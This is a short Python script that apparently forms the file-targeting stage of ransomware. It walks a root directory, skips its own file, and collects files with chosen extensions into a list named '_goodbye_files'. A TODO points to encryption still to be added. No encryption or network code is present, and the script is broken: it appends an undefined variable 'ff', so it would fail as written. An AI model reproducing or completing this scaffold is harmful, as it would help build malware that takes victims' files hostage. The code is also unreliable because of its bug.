import os
import Utils

def isInTargetFiles(_extention):
    """
        Binary Search to find extentions in the target files
    """
    left = 0
    right = len(Utils.file_extentions) - 1

    while left <= right:
        mid = (left + right)// 2
        current = Utils.file_extentions[mid]
        if current  > _extention:
            right = mid - 1
        elif current  < _extention:
            left = mid + 1
        else:
            return True
    return False

def isValidFile(file_path):
    """
        Determining whether the file is valid or not
    """
    if file_path != Utils.whatismyname:
        _extention = file_path.split(".")[-1]
        if len(_extention) == 1 or isInTargetFiles(_extention):
            return True
    return False

def findFiles(path):
    """
        Find
    """
    _goodbye_files = []
    for directory_path, directories, files in os.walk(path):
        for fiile in files:
            if isValidFile(fiile):
                _goodbye_files.append(os.path.join(directory_path,ff))
    return _goodbye_files

def main():
    """
    TODO Async -> File Explorer and Encryption
    """
    found_files = findFiles(Utils.root_directory)
    

if __name__ == "__main__":
    main()